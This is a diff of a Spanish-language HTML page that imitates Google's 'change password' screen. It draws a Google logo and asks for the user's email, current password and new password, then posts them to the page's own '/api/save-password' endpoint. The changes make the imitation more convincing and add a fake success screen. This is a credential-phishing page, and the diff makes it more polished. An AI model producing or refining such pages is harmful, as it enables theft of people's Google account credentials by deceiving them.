@@ -2,95 +2,88 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cambiar contraseña - Cuenta de Google</title>
     <style>
         body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background-color: #fff;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background-color: #f0f4f9;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
-            color: #202124;
         }
         .container {
-            width: 400px;
+            background: #ffffff;
+            width: 100%;
+            max-width: 450px;
             padding: 40px;
-            text-align: left;
-        }
-        .google-logo {
-            font-size: 22px;
-            font-weight: 500;
-            margin-bottom: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .google-logo span span:nth-child(1) { color: #4285F4; }
-        .google-logo span span:nth-child(2) { color: #EA4335; }
-        .google-logo span span:nth-child(3) { color: #FBBC05; }
-        .google-logo span span:nth-child(4) { color: #4285F4; }
-        .google-logo span span:nth-child(5) { color: #34A853; }
-        .google-logo span span:nth-child(6) { color: #EA4335; }
-
-        h2 {
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 24px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            box-sizing: border-box;
             text-align: center;
         }
-        h3 {
-            font-size: 16px;
-            font-weight: 500;
+        .logo {
+            width: 75px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-top: 0;
             margin-bottom: 8px;
         }
-        p.subtitle {
+        .subtitle {
             font-size: 14px;
             color: #5f6368;
-            margin-bottom: 24px;
-            line-height: 1.4;
+            margin-bottom: 32px;
+            text-align: left;
         }
-        .input-group {
+        .form-group {
             position: relative;
-            margin-bottom: 16px;
+            margin-bottom: 20px;
+            text-align: left;
         }
         input {
             width: 100%;
             padding: 13px 15px;
-            border: 1px solid #dadce0;
+            border: 1px solid #747775;
             border-radius: 4px;
             font-size: 16px;
             box-sizing: border-box;
             outline: none;
-            transition: border 0.2s;
+            transition: border-color 0.2s;
         }
         input:focus {
-            border: 2px solid #1a73e8;
+            border-color: #1a73e8;
+            border-width: 2px;
             padding: 12px 14px;
         }
-        .hint {
+        .helper-text {
             font-size: 12px;
             color: #5f6368;
-            margin-bottom: 16px;
-            margin-top: -10px;
+            margin-top: 4px;
+            text-align: left;
         }
         .buttons-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 30px;
+            margin-top: 32px;
         }
-        .btn-omitir {
+        .btn-link {
             background: none;
             border: none;
             color: #1a73e8;
-            font-weight: 500;
             font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
-            padding: 10px 0;
+            padding: 0;
         }
-        .btn-guardar {
+        .btn-primary {
             background-color: #1a73e8;
             color: white;
             border: none;
@@ -99,95 +92,107 @@
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
+            transition: background-color 0.2s;
         }
-        .btn-guardar:hover {
+        .btn-primary:hover {
             background-color: #1557b0;
         }
-        #message {
-            margin-top: 15px;
-            font-size: 14px;
-            text-align: center;
+        /* Pantalla de éxito oculta al inicio */
+        #success-screen {
+            display: none;
+        }
+        .success-icon {
+            color: #1e8e3e;
+            font-size: 48px;
+            margin-bottom: 16px;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div class="google-logo">
-            <span>
-                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-            </span>
+        <!-- Formulario principal -->
+        <div id="form-screen">
+            <svg class="logo" viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#4285F4" d="M9.42 16.5v-3.72H3.1v3.72H0V6.6h3.1v3.45h6.32V6.6H12.5v9.9h-3.08z"/>
+                <path fill="#34A853" d="M19.12 16.82c-2.3 0-4.05-.72-5.25-2.16-1.2-1.44-1.8-3.37-1.8-5.8 0-2.42.6-4.34 1.8-5.76 1.2-1.42 2.95-2.13 5.25-2.13 1.95 0 3.52.55 4.7 1.66 1.18 1.11 1.77 2.68 1.77 4.72v.9h-9.52c.1 1.45.62 2.57 1.55 3.36.93.79 2.06 1.18 3.39 1.18 1.45 0 2.62-.43 3.51-1.29l1.88 1.7c-1.22 1.22-2.92 1.83-5.1 1.83zm6.3-10.22c-.83-.84-1.93-1.26-3.3-1.26s-2.47.42-3.3 1.26c-.83.84-1.27 1.96-1.32 3.36h9.24c-.05-1.4-.49-2.52-1.32-3.36z"/>
+                <path fill="#FBBC05" d="M33.8 16.5V2.8h3.1v13.7h-3.1z"/>
+                <path fill="#EA4335" d="M48.22 16.82c-2.3 0-4.05-.72-5.25-2.16-1.2-1.44-1.8-3.37-1.8-5.8 0-2.42.6-4.34 1.8-5.76 1.2-1.42 2.95-2.13 5.25-2.13 1.95 0 3.52.55 4.7 1.66 1.18 1.11 1.77 2.68 1.77 4.72v.9h-9.52c.1 1.45.62 2.57 1.55 3.36.93.79 2.06 1.18 3.39 1.18 1.45 0 2.62-.43 3.51-1.29l1.88 1.7c-1.22 1.22-2.92 1.83-5.1 1.83zm6.3-10.22c-.83-.84-1.93-1.26-3.3-1.26s-2.47.42-3.3 1.26c-.83.84-1.27 1.96-1.32 3.36h9.24c-.05-1.4-.49-2.52-1.32-3.36z"/>
+            </svg>
+            <h1>Cambiar contraseña</h1>
+            <div class="subtitle">
+                Crea una contraseña segura<br>
+                <span style="font-size: 12px; color: #747775;">Introduce tu correo, tu contraseña actual y define una contraseña nueva y segura.</span>
+            </div>
+
+            <form id="reset-form">
+                <div class="form-group">
+                    <input type="email" name="email" placeholder="Correo electrónico" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="oldPassword" placeholder="Contraseña anterior" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Crear contraseña" required>
+                    <div class="helper-text">Utiliza al menos 8 caracteres.</div>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="confirmation" placeholder="Confirmación de contraseña" required>
+                </div>
+
+                <div class="buttons-row">
+                    <button type="button" class="btn-link">Omitir</button>
+                    <button type="submit" class="btn-primary">Guardar contraseña</button>
+                </div>
+            </form>
         </div>
-        <h2>Cambiar contraseña</h2>
 
-        <h3>Crea una contraseña segura</h3>
-        <p class="subtitle">Introduce tu correo, tu contraseña actual y define una contraseña nueva y segura.</p>
-
-        <form id="passwordForm">
-            <div class="input-group">
-                <input type="email" id="email" required placeholder="Correo electrónico">
-            </div>
-
-            <div class="input-group">
-                <input type="password" id="oldPassword" required placeholder="Contraseña anterior">
-            </div>
-
-            <div class="input-group">
-                <input type="password" id="password" required placeholder="Crear contraseña">
-            </div>
-            <div class="hint">Utiliza al menos ocho caracteres.</div>
-
-            <div class="input-group">
-                <input type="password" id="confirmation" required placeholder="Confirmación de contraseña">
-            </div>
-
-            <div class="buttons-row">
-                <button type="button" class="btn-omitir">Omitir</button>
-                <button type="submit" class="btn-guardar">Guardar contraseña</button>
-            </div>
-        </form>
-        <div id="message"></div>
+        <!-- Pantalla de Éxito Estilo Google (Reemplaza al alert feo) -->
+        <div id="success-screen">
+            <div class="success-icon">✔️</div>
+            <h1>¡Se guardaron los cambios!</h1>
+            <p class="subtitle" style="text-align: center;">Tu contraseña se ha cambiado correctamente. Ya puedes cerrar esta ventana.</p>
+        </div>
     </div>
 
     <script>
-        document.querySelector('form').addEventListener('submit', async (e) => {
-  e.preventDefault(); // Evita que la página se recargue y se quede trabada
+        document.getElementById('reset-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const boton = document.querySelector('button[type="submit"]');
+            boton.innerText = "Guardando...";
+            boton.disabled = true;
 
-  // Cambia el texto del botón visualmente
-  const boton = document.querySelector('button[type="submit"]');
-  if (boton) boton.innerText = "Guardando...";
+            const email = document.querySelector('input[name="email"]').value;
+            const oldPassword = document.querySelector('input[name="oldPassword"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            const confirmation = document.querySelector('input[name="confirmation"]').value;
 
-  // Captura los valores de los campos de texto
-  const email = document.querySelector('input[type="email"]').value;
-  const inputs = document.querySelectorAll('input[type="password"]');
-  const oldPassword = inputs[0] ? inputs[0].value : '';
-  const password = inputs[1] ? inputs[1].value : '';
-  const confirmation = inputs[2] ? inputs[2].value : password;
+            try {
+                const respuesta = await fetch('/api/save-password', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, oldPassword, password, confirmation })
+                });
 
-  try {
-    // AQUÍ ESTÁ EL CAMBIO CLAVE: Envía los datos a tu servidor de Node.js
-    const respuesta = await fetch('/api/save-password', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({ email, oldPassword, password, confirmation })
-    });
+                const resultado = await respuesta.json();
 
-    const resultado = await respuesta.json();
-
-    if (resultado.success) {
-      alert('¡Contraseña actualizada con éxito!');
-      location.reload(); // Recarga la página limpia
-    } else {
-      alert('Error al guardar.');
-      if (boton) boton.innerText = "Guardar contraseña";
-    }
-  } catch (error) {
-    console.error('Error de red:', error);
-    alert('Ocurrió un error de conexión.');
-    if (boton) boton.innerText = "Guardar contraseña";
-  }
-});
+                if (resultado.success) {
+                    // Oculta el formulario y muestra la pantalla de éxito limpia
+                    document.getElementById('form-screen').style.display = 'none';
+                    document.getElementById('success-screen').style.display = 'block';
+                } else {
+                    alert('Error al procesar la solicitud.');
+                    boton.innerText = "Guardar contraseña";
+                    boton.disabled = false;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error de conexión con el servidor.');
+                boto.innerText = "Guardar contraseña";
+                boton.disabled = false;
+            }
+        });
     </script>
 </body>
 </html>
